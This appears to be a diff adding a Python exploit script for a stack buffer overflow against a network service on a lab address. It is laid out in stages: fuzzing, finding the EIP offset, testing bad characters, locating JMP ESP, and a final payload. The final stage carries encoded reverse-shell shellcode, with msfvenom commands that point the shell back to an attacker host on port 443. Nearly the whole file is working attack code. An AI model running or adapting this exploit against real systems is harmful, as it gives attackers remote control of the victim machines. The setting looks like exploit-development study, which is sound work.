@@ -1,0 +1,196 @@
+################################################################################
+#Fuzz and Overwrite EIP
+################################################################################
+#!/usr/bin/python
+import socket
+import time
+
+"""
+buffer	= []
+buffer.append("A")
+counter	= 100
+while len(buffer) <= 81:
+	Add2Buff	= "A" * counter
+	buffer.append(Add2Buff)
+	counter	= counter + 200
+"""
+
+a = 2560
+a = "A" * 2558
+buffer = [a]
+
+for string in buffer:
+	print("Fuzzing PASS with {} bytes".format(len(string)))
+	#begins the process of opening a normal socket
+	s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("192.168.167.10", 7001))
+	s.send(string)
+	s.close()
+	time.sleep(2)
+
+
+################################################################################
+#Find EIP location/offset
+################################################################################
+#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 
+#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 
+#!/usr/bin/python
+import socket
+string ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2D"
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
+
+################################################################################
+#Confirm EIP location/offset
+################################################################################
+#!/usr/bin/python
+import socket
+a = "A" * 2288
+b = "B" * 4
+c = "C" * 4
+
+string = a + b + c
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
+
+################################################################################
+#Find Size of writeable space
+################################################################################
+#!/usr/bin/python
+import socket
+a = "A" * 2288
+b = "B" * 4
+c = "C" * 2000
+
+string = a + b + c
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
+
+################################################################################
+#Find BadChars, then find JMP ESP
+################################################################################
+#1.
+#!mona jmp -r esp -cpb “\x00\x0A”        << bad charachters
+#	^^^ may lead you right to it
+#2.
+#!mona modules
+#	look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)
+#	!mona find -s “\xff\xe4” -m yeet.dll
+#		^^^Look at address
+#3.
+#ctrl f in top left pane for JMP ESP
+#!/usr/bin/python
+import socket
+a = "A" * 2288
+b = "B" * 4
+c = ""
+cl = []
+badchar = [0x00]
+for ch in range (0x00 , 0xFF+1):
+	if ch not in badchar:
+		cl.append(chr(ch))
+for i in cl:
+	c += i
+string = a + b + c
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
+
+################################################################################
+#Verify Jmp ESP Functionality
+################################################################################
+#!/usr/bin/python
+import socket
+a = "A" * 2288
+b = "\xcf\x10\x80\x14"
+c = "C" * 20
+
+string = a + b + c
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
+
+################################################################################
+#Exloit the mofo
+################################################################################
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b \\x00 -e x86/alpha_upper > payload.txt
+#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC= thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d" 
+#!/usr/bin/python
+import socket
+a = "A" * 2288
+b = "\xcf\x10\x80\x14"
+c = (
+"\x89\xe3\xd9\xed\xd9\x73\xf4\x5b\x53\x59\x49\x49\x49\x49\x43"
+"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
+"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
+"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
+"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4d\x52\x55\x50"
+"\x33\x30\x45\x50\x33\x50\x4b\x39\x4d\x35\x50\x31\x4f\x30\x32"
+"\x44\x4c\x4b\x30\x50\x50\x30\x4c\x4b\x56\x32\x34\x4c\x4c\x4b"
+"\x36\x32\x52\x34\x4c\x4b\x34\x32\x46\x48\x44\x4f\x48\x37\x51"
+"\x5a\x37\x56\x46\x51\x4b\x4f\x4e\x4c\x47\x4c\x35\x31\x53\x4c"
+"\x54\x42\x56\x4c\x31\x30\x39\x51\x38\x4f\x44\x4d\x45\x51\x58"
+"\x47\x4d\x32\x4b\x42\x30\x52\x36\x37\x4c\x4b\x30\x52\x44\x50"
+"\x4c\x4b\x51\x5a\x47\x4c\x4c\x4b\x50\x4c\x42\x31\x54\x38\x4a"
+"\x43\x37\x38\x43\x31\x38\x51\x30\x51\x4c\x4b\x56\x39\x57\x50"
+"\x53\x31\x49\x43\x4c\x4b\x31\x59\x34\x58\x4a\x43\x57\x4a\x50"
+"\x49\x4c\x4b\x30\x34\x4c\x4b\x43\x31\x48\x56\x56\x51\x4b\x4f"
+"\x4e\x4c\x4f\x31\x38\x4f\x34\x4d\x33\x31\x58\x47\x36\x58\x4d"
+"\x30\x52\x55\x4c\x36\x35\x53\x33\x4d\x5a\x58\x57\x4b\x43\x4d"
+"\x37\x54\x34\x35\x4b\x54\x51\x48\x4c\x4b\x50\x58\x36\x44\x53"
+"\x31\x58\x53\x35\x36\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x31\x48"
+"\x35\x4c\x55\x51\x4e\x33\x4c\x4b\x43\x34\x4c\x4b\x53\x31\x48"
+"\x50\x4b\x39\x57\x34\x51\x34\x47\x54\x51\x4b\x31\x4b\x45\x31"
+"\x31\x49\x51\x4a\x56\x31\x4b\x4f\x4d\x30\x31\x4f\x51\x4f\x31"
+"\x4a\x4c\x4b\x32\x32\x5a\x4b\x4c\x4d\x31\x4d\x32\x48\x47\x43"
+"\x47\x42\x53\x30\x55\x50\x45\x38\x34\x37\x53\x43\x37\x42\x31"
+"\x4f\x31\x44\x42\x48\x30\x4c\x44\x37\x51\x36\x53\x37\x4b\x4f"
+"\x58\x55\x58\x38\x5a\x30\x45\x51\x45\x50\x45\x50\x47\x59\x38"
+"\x44\x30\x54\x36\x30\x33\x58\x31\x39\x4b\x30\x52\x4b\x33\x30"
+"\x4b\x4f\x48\x55\x56\x30\x46\x30\x30\x50\x30\x50\x51\x50\x30"
+"\x50\x47\x30\x56\x30\x52\x48\x4a\x4a\x54\x4f\x59\x4f\x4b\x50"
+"\x4b\x4f\x4e\x35\x4d\x47\x33\x5a\x34\x45\x53\x58\x39\x50\x49"
+"\x38\x53\x47\x59\x37\x55\x38\x44\x42\x45\x50\x35\x51\x4f\x4b"
+"\x4c\x49\x4b\x56\x32\x4a\x32\x30\x31\x46\x50\x57\x33\x58\x5a"
+"\x39\x49\x35\x54\x34\x35\x31\x4b\x4f\x38\x55\x4c\x45\x39\x50"
+"\x54\x34\x34\x4c\x4b\x4f\x30\x4e\x45\x58\x52\x55\x5a\x4c\x32"
+"\x48\x4a\x50\x38\x35\x59\x32\x36\x36\x4b\x4f\x38\x55\x52\x48"
+"\x33\x53\x42\x4d\x35\x34\x55\x50\x4c\x49\x5a\x43\x56\x37\x30"
+"\x57\x31\x47\x56\x51\x5a\x56\x43\x5a\x54\x52\x50\x59\x56\x36"
+"\x5a\x42\x4b\x4d\x52\x46\x58\x47\x47\x34\x31\x34\x57\x4c\x55"
+"\x51\x33\x31\x4c\x4d\x47\x34\x37\x54\x52\x30\x4f\x36\x35\x50"
+"\x37\x34\x56\x34\x36\x30\x56\x36\x50\x56\x51\x46\x47\x36\x31"
+"\x46\x50\x4e\x50\x56\x51\x46\x31\x43\x31\x46\x33\x58\x43\x49"
+"\x58\x4c\x57\x4f\x4d\x56\x4b\x4f\x49\x45\x4c\x49\x4d\x30\x30"
+"\x4e\x36\x36\x50\x46\x4b\x4f\x50\x30\x45\x38\x54\x48\x4d\x57"
+"\x35\x4d\x35\x30\x4b\x4f\x58\x55\x4f\x4b\x4c\x30\x4e\x55\x39"
+"\x32\x51\x46\x43\x58\x39\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f"
+"\x49\x45\x37\x4c\x44\x46\x33\x4c\x34\x4a\x4b\x30\x4b\x4b\x4b"
+"\x50\x54\x35\x55\x55\x4f\x4b\x50\x47\x52\x33\x53\x42\x52\x4f"
+"\x42\x4a\x45\x50\x50\x53\x4b\x4f\x58\x55\x41\x41"
+)
+string = a + b + ("\x90" * 20) +  c + ("\x90" * 20)
+#begins the process of opening a normal socket
+s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.167.10", 7001))
+s.send(string)
+s.close()
+
